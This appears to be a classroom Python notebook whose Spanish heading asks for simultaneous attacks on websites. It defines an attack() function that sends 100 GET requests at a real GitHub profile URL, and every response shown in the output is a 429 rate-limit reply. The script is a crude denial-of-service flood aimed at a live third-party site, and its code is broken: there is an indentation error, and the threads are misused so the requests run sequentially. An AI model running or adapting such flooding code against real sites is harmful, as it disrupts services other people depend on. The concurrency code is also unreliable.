# %% [markdown]
# ## Third Program

# %% [markdown]
# ### Se solicita realizar ataques simultáneos a los siguientes sitios web

# %%
import threading, os, platform, requests

# %%
numPaquetesparaEnviar = 100

# %% [markdown]
# ### http codes

# %%
from IPython import display

# %%
display.Image("statuscode.png")

# %%
url = "https://github.com/sukuzhanay"

# %%
   def attack():
    print(requests.get(url))
    threading.current_thread()

# %%
for i in range (numPaquetesparaEnviar):
    threading.Thread(target= attack()).start()
# Out:
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# <Response [429]>
# ...
